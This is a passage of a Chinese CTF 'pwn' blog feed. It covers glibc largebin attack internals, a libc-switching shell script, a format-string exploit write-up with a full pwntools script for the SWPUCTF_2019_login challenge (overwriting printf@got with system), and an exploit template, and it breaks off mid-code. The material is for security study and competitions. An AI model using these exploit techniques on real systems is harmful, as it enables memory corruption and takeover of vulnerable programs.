the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x55616307d0a0 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x55616307d7a0 &lt;--&gt; 0x55616307d0a0 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;</span>s <span class="string">&quot;size&quot;</span> as well as its <span class="string">&quot;bk&quot;</span> and <span class="string">&quot;bk_nextsize&quot;</span> pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we <span class="built_in">set</span> <span class="string">&quot;bk&quot;</span> to 16 bytes before stack_var1 and <span class="string">&quot;bk_nextsize&quot;</span> to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span></span><br><span class="line"><span class="string">stack_var1 (0x7ffe4c957580): 0x55616307d7a0</span></span><br><span class="line"><span class="string">stack_var2 (0x7ffe4c957588): 0x55616307d7a0</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>关键代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>我们改掉size使得p2变小，并且改掉bk和bk_nextsize为栈地址</p><p>当我们malloc(0x90)的时候，位于ub的p3会执行如下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     <span class="comment">// p3-&gt;fd_nextsize = p2</span></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     <span class="comment">// p3-&gt;bk_nextsize = p2-&gt;nextsize = 覆写的栈地址(&amp;stack_var2 - 4)</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     <span class="comment">// *(&amp;stack_var2 - 4 + 4) 写入p3</span></span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line"><span class="comment">// bck = (&amp;stack_var1 - 2)</span></span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line"><span class="comment">// p3-&gt;bk = bck = (&amp;stack_var2 - 4)</span></span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line"><span class="comment">// p3-&gt;fd = fwd</span></span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line"><span class="comment">// bck-&gt;fd = *(&amp;stack_var1 - 2 + 2) = p3</span></span><br><span class="line">     bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>借用A1ex师傅博客总结如下：</p><blockquote><ol><li><code>victim</code>（也即<code>unsorted chunk</code>）的<code>size</code>必须大于 <code>largebin chunk</code>，这样才能够绕过<code>else</code>之前的检测；</li><li>控制<code>fwd-&gt;bk_nextsize</code>为<code>target_addr1</code>，那么执行<code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>时，就能控制<code>victim-&gt;bk_nextsize</code>为 <code>traget_addr1</code>;</li><li>接着就能控制 <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>，也就相当于 <code>target_addr1-&gt;fd_nextsize = victim</code>，我们在 <code>*(taget_addr1+0x20)=victim</code> 写入了 <code>unsorted chunk</code>的地址；</li><li>然后，我们修改<code>fwd-&gt;bk</code>为<code>target_addr2</code>，就能控制 <code>bck</code>；</li><li>最后，通过 <code>bck-&gt;fd=victim</code>，就能在 <code>*(target_addr2+0x10)=victim</code>，又写入了 <code>unsortedbin chunk</code>的地址</li></ol><p>总结就是，如果能够控制已经在<code>largebin</code>中的chunk的<code>bk、bk_nextsize</code>字段，那么就能实现往任意地址写入待插入<code>largebin</code>的chunk的地址。一般待插入的<code>chunk</code>地址为堆地址，所以通过<code>largebin attack</code>可以实现往任意地址写入堆地址的目的</p></blockquote><h4 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h4><p>我认为，利用手法很简要，控制largebin中chunk的bk字段为(&amp;target - 2)或者bk_nextsize字段为(&amp;target - 4)，那么target里面将会被写入堆地址，注意size不能相同，fd等位置置0避免进入unlink</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>让我先找找看2333</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> largebin attack </tag>
            
            <tag> ptmalloc2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell脚本 + patchelf方便切换libc</title>
      <link href="2021/07/23/switch-libc/"/>
      <url>2021/07/23/switch-libc/</url>
      
        <content type="html"><![CDATA[<h2 id="更便捷切换libc"><a href="#更便捷切换libc" class="headerlink" title="更便捷切换libc"></a>更便捷切换libc</h2><p>目前自己的切换libc的方法是用<code>patchelf --set-interpreter</code>换ld文件 + <code>LD_PRELOAD</code>换libc<br>并且我的libc都在/glibc/目录下<br><img src="https://i.loli.net/2021/07/23/nwqIE4P7WOvmsj2.png" alt=""></p><p>于是感觉有点麻烦，遂写了个shell脚本，主要是省略了路径上的困难<br>思路就是case语句判断是哪个版本的，然后判断是32还是64位的，还要加上一个—help<br>思路有点死板，路径啥的被我写死了（x</p><p>目前没发现啥问题<br><img src="https://i.loli.net/2021/07/23/mk6QuJPaZO5134F.png" alt=""><br><img src="https://i.loli.net/2021/07/23/V19xLjUle4yrXRF.png" alt=""></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/zsh</span></span><br><span class="line"></span><br><span class="line">if [[ $1 = &quot;--help&quot; ]] || [[ $1 = &quot;-h&quot; ]] || [[ $1 = &quot;&quot; ]]</span><br><span class="line">then</span><br><span class="line">    echo &quot;--------------------&quot;</span><br><span class="line">    echo &quot;arg1: libc版本&quot;</span><br><span class="line">    echo &quot;arg2: 32 or 64&quot;</span><br><span class="line">    echo &quot;arg3: binary path&quot;</span><br><span class="line">    echo &quot;such as: sl 2.23 64 ./pwn&quot;</span><br><span class="line">    echo &quot;--------------------&quot;</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">message=&quot;请查看帮助 -h (--help)&quot;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">&quot;2.23&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.23-0ubuntu11.3_i386/ld-2.23.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.27&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.27-3ubuntu1.2_i386/ld-2.27.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.27-3ubuntu1.2_i386/libc-2.27.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.29&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.29/64/lib/ld-2.29.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.29/64/lib/libc-2.29.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.29/32/lib/ld-2.29.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.29/32/lib/libc-2.29.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.31&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.31/64/lib/ld-2.31.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.31/64/lib/libc-2.31.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.31/32/lib/ld-2.31.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.31/32/lib/libc-2.31.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo $message</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">figlet -f small &quot;Switch the  libc&quot;</span><br><span class="line">echo -e &quot;\033[1;32mld-path:$ld\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[1;32mlibc-path:$libc\033[0m&quot;</span><br><span class="line">figlet -f small &quot;Switch the  libc&quot;</span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter $ld $3</span><br><span class="line">LD_PRELOAD=$libc $3</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bss段上格式化字符串的利用手法</title>
      <link href="2021/07/19/format-bss/"/>
      <url>2021/07/19/format-bss/</url>
      
        <content type="html"><![CDATA[<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>bss段上的利用手法与栈不同，因为不能向栈中直接写入数据了</p><p>利用手法是一个间接写入的思想</p><p>用C’代替C，C’和C相似</p><blockquote><p>A -&gt; B -&gt; C</p><p>A -&gt; B -&gt; C’</p></blockquote><p>常见利用手法：</p><ul><li>改ret地址中的__libc_start_main改为one_gadget</li><li>改printf的got为system</li></ul><h2 id="SWPUCTF-2019-login"><a href="#SWPUCTF-2019-login" class="headerlink" title="SWPUCTF_2019_login"></a>SWPUCTF_2019_login</h2><p>一个典型的bss段上的格式化字符串，可以无限输入</p><p>因为checksec后发现got表可写，思路就是将printf@got的内容改为system，然后输入/bin/sh即可getshell</p><p>步骤分三步：</p><ol><li>找到第一个跳板，将其改为printf@got</li><li>找到第二个跳板，将其改为printf@got + 2</li><li>一次性将printf@got的后四位改为system的后四位，将printf@got + 2的后两位改为system&gt;&gt;16的后两位</li></ol><p>前两步又分为两个小步，现将中间过程截图如下：</p><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><blockquote><p>找到第一个跳板</p></blockquote><p><img src="https://i.loli.net/2021/07/21/LOzf9NEIjK7spCo.png" alt=""></p><blockquote><p>将第一个跳板改为printf@got</p></blockquote><p><img src="https://i.loli.net/2021/07/21/snqPy763Dl8pdBH.png" alt=""></p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>（同step1）</p><p>完成前两步后，最终效果如下所示</p><p><img src="https://i.loli.net/2021/07/21/keJgx3hBKsY9OcZ.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./SWPUCTF_2019_login&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../32-libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params"> payload</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># %15$p</span></span><br><span class="line">    <span class="comment"># %21$p</span></span><br><span class="line">    ru(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;lemon&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please input your password:&quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;%15$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base=<span class="number">16</span>) - <span class="number">241</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    fmt(<span class="string">&quot;%21$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base=<span class="number">16</span>)</span><br><span class="line">    target = stack - <span class="number">0x90</span></span><br><span class="line">    echo(<span class="string">&quot;target:&quot;</span> + <span class="built_in">hex</span>(target))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    offset = -<span class="number">0x30</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((target + offset) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    fmt(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x90</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((elf.got[<span class="string">&quot;printf&quot;</span>]) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset // <span class="number">4</span>) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    offset = -<span class="number">0x38</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((target + offset) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    fmt(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x90</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((elf.got[<span class="string">&quot;printf&quot;</span>] + <span class="number">2</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset // <span class="number">4</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    sd(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># attack</span></span><br><span class="line">    offset1 = -<span class="number">0x30</span>     <span class="comment"># got</span></span><br><span class="line">    offset2 = -<span class="number">0x38</span>     <span class="comment"># got + 2</span></span><br><span class="line">    echo(<span class="string">&quot;system:&quot;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>])) </span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((libc.sym[<span class="string">&quot;system&quot;</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset2 // <span class="number">4</span>) + <span class="string">&quot;$hhn&quot;</span> </span><br><span class="line">    temp = (libc.sym[<span class="string">&quot;system&quot;</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((libc.sym[<span class="string">&quot;system&quot;</span>] &amp; <span class="number">0xffff</span>) - temp) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset1 // <span class="number">4</span>) + <span class="string">&quot;$hn&quot;</span> </span><br><span class="line">    sd(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29886</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./SWPUCTF_2019_login&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn exp模板 + vscode snippet</title>
      <link href="2021/07/19/Snippet/"/>
      <url>2021/07/19/Snippet/</url>
      
        <content type="html"><![CDATA[<p>  snippet，或者说「code snippet」，也即代码片，指的是能够帮助输入重复代码模式，比如循环或条件语句，的模板。通过 snippet ，我们仅仅输入一小段字符串，就可以在代码片引擎的帮助下，生成预定义的模板代码，接着我们还可以通过在预定义的光标位置之间跳转，来快速补全模板。</p><p>vscode 集成了这种功能，ctrl + shift + p，就可以调出“配置用户代码片段”的功能</p><p>因为pwn模板很多都相似，比如都会加载binary文件，在heap菜单中都有add等诸如此类的功能，每次写都会很麻烦，我之前配置过snippet，但是想要一个半自动化的方法来配置，写了一个小脚本来完成这个功能</p><ul><li>github地址:<a href="https://github.com/LA13x/vscode-snippet-pwn-template">https://github.com/LA13x/vscode-snippet-pwn-template</a></li></ul><h2 id="pwn-exp框架"><a href="#pwn-exp框架" class="headerlink" title="pwn exp框架"></a>pwn exp框架</h2><p>此框架采用了师傅们的模板，具体链接放到Reference中<br>我写了三个snippet，分别是总体上的pwn框架，menu框架（heap中的）还有64位格式化字符串框架，分别如下</p><h3 id="pwn-py"><a href="#pwn-py" class="headerlink" title="pwn.py"></a>pwn.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;$1&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;$2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set $base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="menu-py"><a href="#menu-py" class="headerlink" title="menu.py"></a>menu.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;$1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span 